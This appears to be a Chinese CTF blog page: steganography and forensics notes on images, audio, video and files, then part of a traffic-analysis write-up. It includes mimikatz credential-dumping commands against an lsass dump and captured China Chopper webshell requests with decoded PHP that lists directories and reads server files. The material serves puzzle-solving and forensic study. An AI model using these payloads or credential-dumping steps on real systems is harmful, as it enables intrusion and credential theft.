12恢复&#x2F;dev&#x2F;sda5中所有数据xtundelete &#x2F;dev&#x2F;sda5 --restore-all 两张相似的图片Beyond Compare 4工具 stegsolve异或 盲水印 1kali compare 1.jpg 2.jpg out.jpg chunk块中藏有信息CRC块中有可打印字符，正常的CRC应该是六个字节，三个十六进制数。比如，C4ED3H。 IDAT标识缺少如果png图片模糊，可能缺少IDAT标识，放入01也会提示，*ERROR: CRC Mismatch @ chunk[2]; in data: f4ff7854; expected: 0761f34a。 01提示 123*ERROR: CRC Mismatch @ chunk[2]; in data: f4ff7854; expected: 0761f34a*ERROR: CRC Mismatch @ chunk[3]; in data: 80a3b703; expected: a4d05483*ERROR: CRC Mismatch @ chunk[29]; in data: 00000000; expected: 5808f045 在工作区查看遍历。 IDAT十六进制标识为：49 44 41 54，将两个chunk的IDAT在union CTYPE type的位置补上即可得到完整的图片。 直接找到对应位置修改。 IDAT信息隐藏IDAT：存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，储存图像像数数据。在数据流中可包含多个连续顺序的图像数据块。采用 LZ77 算法的派生算法进行压缩。可以用 zlib 解压缩。IDAT块只有当上一个块充满时，才会继续下 一个新块。 首先查看png的idat信息，是否有前一块没有满，后一块有数据的情况。 1pngcheck.exe -v sctf.png 我们可以看到最后一个数据块出问题了，根据PNG结构，我们直接搜索ascii码-IDAT，因为是最后一个数据块，所以直接，搜索最后一个idat或者直接搜索49444154。接下来就需要分析该数据块的结构，首先49444154是Chunk Type Code（数据块类型码），他的前面是Length（长度），这里是0000008A，转换成十进制，就是138也就是说，Chunk Data（数据块数据）的长度是138，最后四个字节就是CRC。如图： 去出数据块数据，zlib解压，二进制转字符串。 图片拼接12345678910montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg #把图片碎片合成一个图片# 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpggaps --image=out.jpg --generations=50 --population=120 --size=100 #还原原图片--image 指向拼图的路径--size 拼图块的像素尺寸--generations 遗传算法的代的数量--population 个体数量--verbose 每一代训练结束后展示最佳结果--save 将拼图还原为图像 Honeyview可以打开bgp文件。 db文件如果文件中有.db文件，尝试thumbs文件，db文件在win下不可见，直接再压缩包中拖入工具。 二维码二维码颜色反转，使用stegsolve.jar，进行颜色反转。 有时候两张图片使用stegsove得到一个不清晰二维码，可以继续使用stegsolve修复二维码。 音频隐写Audacity莫斯电码常用工具Audacity 。 把上面的点作为 1，下面的点作为 0 0110011001101100011000010110011101111011011001100110010100111000011001100110010000110100001101100011100000110010001100000011010100110001001100110110001000110101001101000110001101100100011001000011010100111001011000100011000000110100001110000011010100110111001100010011100101100110001110010011010001111101 使用python脚本分析频谱图，对高低振幅转换为01，高振幅为1，低振幅为0。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import numpy as npimport structimport waveimport redef write_records(records, format, f): #Write a sequence of tuples to a binary file of structures. record_struct = Struct(format) for r in records: f.write(record_struct.pack(*r))path = &quot;./music.wav&quot;f = wave.open(path, &quot;rb&quot;)# 读取格式信息# (nchannels, sampwidth, framerate, nframes, comptype, compname)params = f.getparams()nchannels, sampwidth, framerate, nframes = params[:4]# 读取波形数据str_data = f.readframes(nframes)f.close()#将波形数据转换为数组wave_data = np.fromstring(str_data, dtype=np.short)b = &#x27;&#x27;# arr = [elem for elem in wave_data if elem &gt;0]max = 0d = &#x27;&#x27;for i in wave_data: if i &lt;0: if max !=0: if max&lt;25000: d +=&#x27;0&#x27; else: d += &#x27;1&#x27; pass max = 0 if max &lt; i: max = iprint(d)print(&quot;\\n\\n\\n\\n&quot;)a = re.findall(r&#x27;.&#123;8&#125;&#x27;,d)hex_list=[]for i in a: res = hex(int(i,2)) hex_list.append(res)print(hex_list)with open(&quot;result.txt&quot;,&quot;wb&quot;) as f: for x in hex_list: s = struct.pack(&#x27;B&#x27;,int(x,16)) f.write(s) 频谱图直接右键查看频谱图。有时候切换频谱图看不到内容，这里可以修改频率。 听电话号码sox变慢音频 1sox slowed.wav fast.wav speed 3.2 直接查看频谱图 1sox slowed.wav -n spectrogram 修改频谱图使其更清楚 1sox slowed.wav -n spectrogram -z 30 -Z -20 -x 1600 查看音频元数据 12345678910steady@steady:~&#x2F;桌面&#x2F;steady$ sox --i &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wavInput File : &#39;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav&#39;Channels : 1Sample Rate : 8000Precision : 16-bitDuration : 00:00:20.08 &#x3D; 160640 samples ~ 1506 CDDA sectorsFile Size : 321kBit Rate : 128kSample Encoding: 16-bit Signed Integer PCM 只获取该选项对应的信息 12345steady@steady:~&#x2F;桌面&#x2F;steady$ soxi -ss &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav160640steady@steady:~&#x2F;桌面&#x2F;steady$ steady@steady:~&#x2F;桌面&#x2F;steady$ soxi -B &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav128k mediainfo查看音频元数据 123456789101112131415161718192021steady@steady:~&#x2F;桌面&#x2F;steady$ mediainfo &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;fast.wavGeneral Complete name : &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;fast.wav Format : Wave File size : 5.13 MiBDuration : 56 s 62 msOverall bit rate mode : ConstantOverall bit rate : 768 kb&#x2F;sAudioFormat : PCMFormat settings : Little &#x2F; SignedCodec ID : 1Duration : 56 s 62 msBit rate mode : ConstantBit rate : 768 kb&#x2F;sChannel(s) : 1 channelSampling rate : 48.0 kHzBit depth : 16 bitsStream size : 5.13 MiB (100%) silienteye使用sileneye工具打开，即可得到flag。 MP3Stego密码可能藏在字符串中。 使用strings 1strings mp3 | grep &quot;flag&quot; 1Decode.exe -X -P 密码 flag.mp3#解密之后在文件下可能会出现txt文件。 ffmpeg视频分帧 1ffmpeg -i flag.mp4 -f image2 image%d.jpg,将视频分离并且重命名为image1,2,3…jpg的图片文件 1ffmpeg -i flag.mp4 -r 60 -f image2 image%d.jpg,将视频分离并且重命名为image1,2,3…jpg的图片文件 1ffmpeg -i ogreman -map 0:s:0 ogreman-subs.srt 1grep &quot;font size&quot; ogreman-subs.srt | cut -d&quot;&gt;&quot; -f2 也可以分离gif 1ffmpeg -i flag.gif frame_%05d.png 使用MP3脚本12F:\\CTF-tools\\音频隐写\\mp3&gt;python3 F:\\CTF-tools\\音频隐写\\mp3\\mp3.py F:\\CTF-tools\\音频隐写\\mp3\\我很抱歉.mp3HDCTF&#123;she_nerver_be_with_me&#125; dtmf2num双音多频信号（Dual-Tone Multi-Frequency, DTMF），电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。使用工具拿到音频中的电话号码。 通过拨号音的信号频率判断内容。 kali dtmf2num123456789101112131415161718192021222324steady@steady:~/桌面/tools/debian$ dtmf2num /home/steady/桌面/steady/密码.wavDTMF2NUM 0.1.1by Luigi Auriemmae-mail: aluigi@autistici.orgweb: aluigi.org- open /home/steady/桌面/steady/密码.wav wave size 2633728 format tag 1 channels: 2 samples/sec: 48000 avg/bytes/sec: 192000 block align: 4 bits: 16 samples: 1316864 bias adjust: 2 volume peaks: -388 388 normalize: 32379 resampling to: 8000hz- MF numbers: 44- DTMF numbers: 18688422216D09#重要信息。 网站http://dialabc.com/sound/detect/index.html。 脚本也可以使用脚本，修改文件路径直接就可以拿到拨号号码。 1234if __name__ == &#x27;__main__&#x27;: # load wav file。 #这里注意修改文件。 wav = wave.open(&#x27;./1.wav&#x27;, &#x27;r&#x27;) 解码出来的数字可能会有杂音，我们需要根据实际情况去重复。 multimon-ng12345678910111213141516171819root@root:~# multimon-ng -t wav -a dtmf &#x27;/tmp/1.wav&#x27; multimon-ng 1.1.7 (C) 1996/1997 by Tom Sailer HB9JNX/AE4WA (C) 2012-2019 by Elias OenalAvailable demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPEEnabled demodulators: DTMFDTMF: 1DTMF: 1DTMF: 8DTMF: 6DTMF: 8DTMF: 4DTMF: 2DTMF: 2DTMF: 1DTMF: 1DTMF: 6DTMF: 0DTMF: 9 mkvinfoMKVToolNix是一套功能强大的mkv(Matroska)格式制作和处理的工具，支持将多种视频、音频、字幕等格式封装成mkv格式，支持提取mkv内音频及字幕到文件。 注意轨道和轨道类型。这里有三个轨道，可以看到这里有三个轨道–a video, an audio and a subs track。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172steady@steady:~$ mkvinfo ogreman+ EBML 头|+ EBML 版本: 1|+ EBML 读取版本: 1|+ EBML ID 最大长度: 4|+ EBML 大小最大长度: 8|+ 文档类型: matroska|+ 文档类型版本: 2|+ 文档类型读取版本: 2+ 剪辑: 大小 159642|+ 定位头 (子条目将被跳过)|+ EBML void: 大小 148|+ 剪辑信息| + 时间戳缩放: 1000000| + 混流应用程序: Lavf55.12.0| + 写入应用程序: HandBrake 0.10.5 2016021100| + 剪辑 UID: 0x26 0xdd 0x34 0x12 0x3f 0xa9 0xec 0x24 0xe6 0x53 0x9e 0xd3 0x45 0xe1 0xc1 0xe4| + 时长: 00:00:02.500000000|+ 轨道| + 轨道| + 轨道编号: 1 (mkvmerge &amp; mkvextract 的轨道 ID: 0)| + 轨道 UID: 1| + 紧缩标记: 0| + 语言: und| + 编码格式 ID: V_MPEG4/ISO/AVC| + 轨道类型: 视频| + 默认帧时长: 00:00:00.033333333 (对应视频轨的 30.000 帧/场每秒)| + 视频轨道| + 像素宽度: 1156| + 像素高度: 720| + 显示器宽度: 1156| + 显示器高度: 720| + 显示器单位: 3 (宽高比)| + 编解码器私有数据: 大小 44 (H.264 档次: Main @L4.0)| + 轨道| + 轨道编号: 2 (mkvmerge &amp; mkvextract 的轨道 ID: 1)| + 轨道 UID: 2| + 紧缩标记: 0| + 名称: Stereo| + 语言: und| + 编码格式 ID: A_AAC| + 轨道类型: 音频| + 音频轨| + 声道数: 2| + 采样率: 44100.0| + 编解码器私有数据: 大小 5| + 轨道| + 轨道编号: 3 (mkvmerge &amp; mkvextract 的轨道 ID: 2)| + 轨道 UID: 3| + 紧缩标记: 0| + 语言: eng| + 默认轨道标记: 0| + 编码格式 ID: S_TEXT/ASS| + 轨道类型: 字幕| + 编解码器私有数据: 大小 481|+ 标签| + 标签| + 目标| + 简单| + 名称: CREATION_TIME| + 字符串: 2016-11-22T23:49:31Z| + 简单| + 名称: ENCODER| + 字符串: Lavf55.12.0| + 标签| + 目标| + 轨道 UID: 2| + 标签| + 目标| + 轨道 UID: 3|+ 簇 mkvextract提取三个轨道的信息。 123456mkvextract tracks ogreman 0:video 1:audio 2:subssteady@steady:~$ mkvextract tracks &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;output&#x2F;png&#x2F;ogreman 0:video 1:audio 2:subs正在将 CodecID 为 V_MPEG4&#x2F;ISO&#x2F;AVC 的轨道 0 提取到文件「video」。容器格式: AVC&#x2F;H.264 elementary stream 正在将 CodecID 为 A_AAC 的轨道 1 提取到文件「audio」。容器格式: raw AAC file with ADTS headers 正在将 CodecID 为 S_TEXT&#x2F;ASS 的轨道 2 提取到文件「subs」。容器格式: SSA&#x2F;ASS text subtitles 进度: 100% 查看我文件即可获取flag。 mediainfo查看音频元数据 123456789101112131415161718192021steady@steady:~/桌面/tools/stegoVeritas-master/stegoveritas$ mediainfo /home/steady/桌面/tools/music.wavGeneralComplete name : /home/steady/桌面/tools/music.wavFormat : WaveFile size : 313 KiBDuration : 20 s 0 msOverall bit rate mode : ConstantOverall bit rate : 128 kb/sAudioFormat : PCMFormat settings : Little / SignedCodec ID : 1Duration : 20 s 0 msBit rate mode : ConstantBit rate : 128 kb/sChannel(s) : 1 channelSampling rate : 8 000 HzBit depth : 16 bitsStream size : 312 KiB (100%) Steganography音频lsb 1steady@steady:~&#x2F;.local&#x2F;bin$ &#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegolsb wavsteg 1python WavSteg.py -r -s 咻咻咻.wav -o output -n 1 -b 1000 &amp;&amp; cat output morse2ascii使用au软件，将音频文件导出为wav文件。(前提是能分离立体声到单声道。) 1steady@steady:~$ morse2ascii &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav 1234567891011121314151617181920212223steady@steady:~$ morse2ascii &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wavMORSE2ASCII 0.2by Luigi Auriemmae-mail: aluigi@autistici.orgweb: aluigi.org- open &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav wave size 1025374 format tag 1 channels: 1 samples&#x2F;sec: 8000 avg&#x2F;bytes&#x2F;sec: 16000 block align: 2 bits: 16 samples: 512687 bias adjust: 43 volume peaks: -2486 2487 normalize: 30280 resampling to 8000hz- decoded morse data:f029bd6f551139eedeb8e45a175b0786 f029bd6f5 strings命令使用strings命令查看当前文件夹所有文件内容并截取敏感字符 1strings * | grep &quot;flag&quot; 使用strings命令查看指定文件夹中的文件的所有内容 1grep &quot;flag&quot; -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;眼见非实 快速查看jpg有无属性信息 1strings misc2.jpg | grep &quot;?xpacket&quot; word文档改变文字颜色取消隐藏文字选项–&gt;视图–&gt;隐藏文字。 01editor翻转十六进制 GIF图片图片分帧Python脚本 12345678910111213#分离gif.pyfrom PIL import Imagesavepath = &quot;C:/Users/12521/flag/&quot; #保存路径im = Image.open(&#x27;1.gif&#x27;) #从文件加载图像try: im.save(savepath+&#x27;&#123;:d&#125;.png&#x27;.format(im.tell())) #读取每一帧 while True: im.seek(im.tell()+1) #在不同帧之间移动 im.save(savepath+&#x27;&#123;:d&#125;.png&#x27;.format(im.tell())) #保存文件except: pass GIF分帧工具 GifSplitter.exe kali分帧工具 1convert flag.gif flag.png 图片合并12345678910from PIL import Imageimport matplotlib.pyplot as plt #res = Image.new(&#x27;RGBA&#x27;,(402,600)) for x in range(0,201): filename = f&quot;./flag/&#123;x&#125;.png&quot; print(filename) tmp = Image.open(filename) res.paste(tmp,(x*2,0)) plt.imshow(res) plt.show() 12345678910111213141516#拼接图像.pyfrom PIL import Imagepath = &quot;C:/Users/12521/flag/&quot;save_path = &#x27;C:/Users/12521/&#x27;im = Image.new(&#x27;RGBA&#x27;,(2*201,600)) #创建新照片imagefile = [] #存储所有的图像的名称width = 0for i in range(0,201): imagefile.append(Image.open(path+str(i)+&#x27;.png&#x27;)) #遍历，将图像名称存入imagfilefor image in imagefile: im.paste(image,(width,0,2+width,600)) #将图片张贴到另一张图片上 width = width +2 别以7im.save(save_path+&#x27;steady.png&#x27;)im.show() 使用kali工具合并 1root@root:~&#x2F;桌面&#x2F;flag# montage flag*.png -tile x1 -geometry +0+0 flag.png 12-tile是拼接时每行和每列的图片数，这里用x1，就是只一行-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可。 每一帧的间隔时间通过identify命令清晰的打印出每一帧的时间间隔。 12$ identify -format &quot;%s %T \\n&quot; 100.gif第n帧 间隔时间 1steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ identify -verbose flag.gif | grep Delay Python隐写unpy2exe编译文件 1unpy2exe.py -o calc calc.exe uncompyle6拿到pyc文件使用工具得到py文件。 1steady@steady:/tmp/uncompyle6/bin$steady@steady:~$ /home/steady/桌面/tools/python-uncompyle6-master/bin/uncompyle6 /home/steady/桌面/steady/4.pyc stegosaurus使用工具解出藏有的flag。 1steady@steady:/tmp/stegosaurus$ ./stegosaurus -x /tmp/QAQ.pyc python序列化内容的存入123456789import pickle fp &#x3D; open(&quot;2.txt&quot;,&quot;rb+&quot;) &#39;&#39;&#39; 打开序列化文件 &#39;&#39;&#39;fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;) &#39;&#39;&#39; 打开保存文件 &#39;&#39;&#39;a&#x3D;pickle.load(fp) &#39;&#39;&#39; 反序列化文件编译 &#39;&#39;&#39;pickle&#x3D;str(a) &#39;&#39;&#39; 转换成字符串要不然不能保存 &#39;&#39;&#39;fw.write( pickle ) &#39;&#39;&#39; 写入文件 &#39;&#39;&#39;fw.close() &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;fp.close() &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39; 常见命令合并文件1copy &#x2F;B 文件1+文件2+... 合并文件名.rar 生成十六进制xxd命令生成一个hex文件 1xxd -p -r 文件 hex base64隐写12→ ~ b64steg.py -f stego.txt -s output.txtBase_sixty_four_point_five excle修改后缀为rar strings直接搜索flag。 word、ppt直接搜索flag，修改颜色。 转换为zip，或者zip转换doc。 doc如果打不开，尝试放入winhex，将某处改为FF。 使用工具破解密码，AccentOPR.CracKed.By.Hmily[LCG][LSG]。 ppt也可以改变颜色，拿到隐藏的文字。 如果文字复制不了需要先格式刷 vmdk拿到这个文件，可以先使用7z当作压缩包打开。 其次对.fat文件进行挂载。 迷你卡兹123privilege::debugsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full xortool猜测xor加密的密码长度以值(key) 使用方式 123xortool (-x) -c 20 123.txt#-x：代表文件内容为十六进制#-c：后加出现频率最高的字符，文本内容一般是空格（20），二进制文件一般是00 123456789101112131415161718steady@steady:~$ /home/steady/.local/bin/xortool -c 20 /home/steady/桌面/steady/badd3e0621ff43de8cf802545bbd3ed0The most probable key lengths: 2: 12.2% 5: 11.9% 9: 9.8%13: 22.2%20: 6.8%22: 6.2%26: 12.8%30: 4.6%39: 7.8%52: 5.7%Key-length can be 3*n1 possible key(s) of length 13:Good\\tuckToYouFound 1 plaintexts with 95%+ valid charactersSee files filename-key.csv, filename-char_used-perc_valid.csv PDF隐写 wbStego4.3open 总结1、任何文件都可以尝试一下ntfs隐写，不要在过于在意压缩包中的图片，有时候压缩包也可能存在ntfs隐写。 2、图片如果在win下可以正常访问，但是在linux无法访问，一定要尝试crc爆破，修改高度。 3、jpg、png图片都可以修改高度和宽度。 4、遇到jpg文件多查看一下文件属性。 5、遇到图片使用strings查看一下有没有敏感字符。 6、jpg图片藏有一下信息，属性中一定有信息。 1&lt;x:xmpmeta xmlns:x&#x3D;&quot;adobe:ns:meta&#x2F;&quot;&gt;&lt;rdf:RDF xmlns:rdf&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;02&#x2F;22-rdf-syntax-ns#&quot;&#x2F;&gt;&lt;&#x2F;x:xmpmeta&gt; 7、压缩包crc爆破一定要搞清楚文件原始大小是多少，使用bandzip查看。 8、zip可以改doc，同样doc也可以改zip。 9、如果拿到许多文件，肯定有特殊的文件，如果存在于zip中，则要看一看CRC是不是一样。 10、任何i都要把流程走一遍，比如binwalk。 11、拿到二进制先判断数量如果能开放，可以尝试转化为二维码。如果是八的倍数，尝试八个一组转换为二进制。也可以转换成摩斯密码。 12、如果一个文件提示flag不在这里，呢么很可能这个文件还藏有另一个文件，就是ntfs隐写，7z可以看到是否存在隐写流。 13、vmdk文件可以用7z解压。 14、如果有十六进制文件，直接使用01的导入十六进制功能。 15、拿到一个exe文件可以先尝试运行。 16、可以使用strings命令来查看是否存在ntfs。 17、base32解密一定要注意后面的等号个数。 16、多个文件，一定要注意下多个文件的修改日期、大小、md5等。找到不同的呢个一个。 17、一个字符串，判断长度。是否是3、8、2的倍数，3的倍数，八进制。2的倍数十六进制。8的倍数二进制八个一组。是否大于128，大于128减去128转换字符串。 18、看到63、255、127、191，ttl隐写 19、关于二进制，有时候可以逆序、八位逆序。 20、数字有重复的话，手机九键盘。 21、明文攻击一定要使用winrar先进行压缩。如果出现提示：一个文档必须只有一个文件。说明没有用winrar进行压缩。 22、mp4也可以使用exiftool powpow.mp4 23、zsteg也可以检测bmp。","categories":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"}]},{"title":"CTF-流量分析题1","slug":"CTF-流量分析题1","date":"2019-05-07T20:23:21.000Z","updated":"2020-11-15T09:59:18.199Z","comments":true,"path":"2019/05/08/CTF-流量分析题1/","link":"","permalink":"http://s1eady.top/2019/05/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/","excerpt":"","text":"CTF-流量分析题1Chopper开文件追踪TCP 第一个包是连接shell的流量 1234567891011121314151617181920POST /isg.php HTTP/1.1Cache-Control: no-cacheX-Forwarded-For: 10.197.194.76Referer: http://192.168.1.10Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)Host: 192.168.1.10Content-Length: 692Connection: CloseISG2014=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3DHTTP/1.1 200 OKDate: Sun, 07 Sep 2014 16:34:08 GMTServer: Apache/2.2.15 (CentOS)X-Powered-By: PHP/5.3.3Vary: Accept-EncodingContent-Length: 110Connection: closeContent-Type: text/html; charset=UTF-8-&gt;|/var/www/html Linux Linux 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64(apache)|&lt;- 第二个包是列目录的操作 12345678910111213141516171819202122232425262728POST &#x2F;isg.php HTTP&#x2F;1.1Cache-Control: no-cacheX-Forwarded-For: 10.197.194.76Referer: http:&#x2F;&#x2F;192.168.1.10Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)Host: 192.168.1.10Content-Length: 734Connection: CloseISG2014&#x3D;%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1&#x3D;L3Zhci93d3cvaHRtbC8%3DHTTP&#x2F;1.1 200 OKDate: Sun, 07 Sep 2014 16:34:08 GMTServer: Apache&#x2F;2.2.15 (CentOS)X-Powered-By: PHP&#x2F;5.3.3Vary: Accept-EncodingContent-Length: 295Connection: closeContent-Type: text&#x2F;html; charset&#x3D;UTF-8-&gt;|..&#x2F; 2014-09-08 00:08:13 4096 0755css&#x2F; 2014-09-08 00:27:55 4096 0755.&#x2F; 2014-09-08 00:28:33 4096 0755images&#x2F; 2014-09-08 00:27:58 4096 0755upload&#x2F; 2014-09-08 00:28:33 4096 0755isg.php 2014-09-05 23:04:00 34 0644index.php 2014-09-08 00:27:48 0 0644x.tar.gz 2014-09-08 00:17:54 174 0644|&lt;- z0参数 12345678910111213141516171819202122232425@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\\t&quot;.$T.&quot;\\t&quot;.@filesize($P).&quot;\\t&quot;.$E.&quot;&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die(); 接受z1传递过来的参数，打开z1目录，并输出时间、文件大小、以及文件权限。 z1参数 1&#x2F;var&#x2F;www&#x2F;html&#x2F; 第三个包是查看文件内容 1ISG2014=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=%2Fvar%2Fwww%2Fhtml%2Fisg.php 其中z1参数为/var/www/html/isg.php 第四个包同理查看文件内容 1&#x2F;var&#x2F;www&#x2F;html&#x2F;x.tar.gz 该文件的内容应该就是flag了。这里我们直接使用binwalk分离 123456➜ TRF03 Chopper binwalk -e Chopper&#x2F;Chopper.pcapDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 Libpcap capture file, little-endian, version 2.4, Ethernet, snaplen: 655357490 0x1D42 gzip compressed data, from Unix, last modified: 2014-09-07 16:17:54 是一个linux的压缩包文件，修改后缀.tar.gz拿到flag。 Routerftp名字为sftp，应该是ftp流量分析。追踪tcp发现ftp登录操作，并涉及到一个zip压缩包。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647220 (vsFTPd 3.0.2)USER forensics331 Please specify the password.PASS passw0rd230 Login successful.SYST215 UNIX Type: L8FEAT211-Features: EPRT EPSV MDTM PASV REST STREAM SIZE TVFS UTF8211 EndOPTS UTF8 ON200 Always in UTF8 mode.PWD257 &quot;/&quot;TYPE I200 Switching to Binary mode.PASV227 Entering Passive Mode (172,16,4,236,203,159).CWD /250 Directory successfully changed.LIST150 Here comes the directory listing.226 Directory send OK.PASV227 Entering Passive Mode (172,16,4,236,86,60).CWD /files/250 Directory successfully changed.LIST150 Here comes the directory listing.226 Directory send OK.PASV227 Entering Passive Mode (172,16,4,236,155,254).SIZE /files/zip.zip213 12092MDTM /files/zip.zip213 20140913131803RETR /files/zip.zip150 Opening BINARY mode data connection for /files/zip.zip (12092 bytes).226 Transfer complete. 继续查看每个流发现一个PK头，最底有个flag。 12345678910PK........%j-E8I.......2......flag.pngUT ...|.T*|.Tux...............eP\\[.6. . ...;A.;..kpm.5......4.&#123;. ....A.k......wj~...N.:u....^.9..Z&#123;......D#B&#123;.........W....-P...3bb^..r.....~&#125;...O.....x.1...E...7..o..*]uOVV..&#x2F;..a...G.......a#....F.J.|4....C0k...ZS... ..;.#s-.$...+)..(.Qy...M..U..Pe......a..3.....[....Y.zI..U...J&#39;.v......I....M.7.&#125;...OR....e_._......X..........?0.3...k..e.Zb.....q4...F:+E.x........ .rH.....H&#x3D;..A.....%...............9..3*S...W.^3...K...s......&#96;..X..G.......AS....eE..........-. 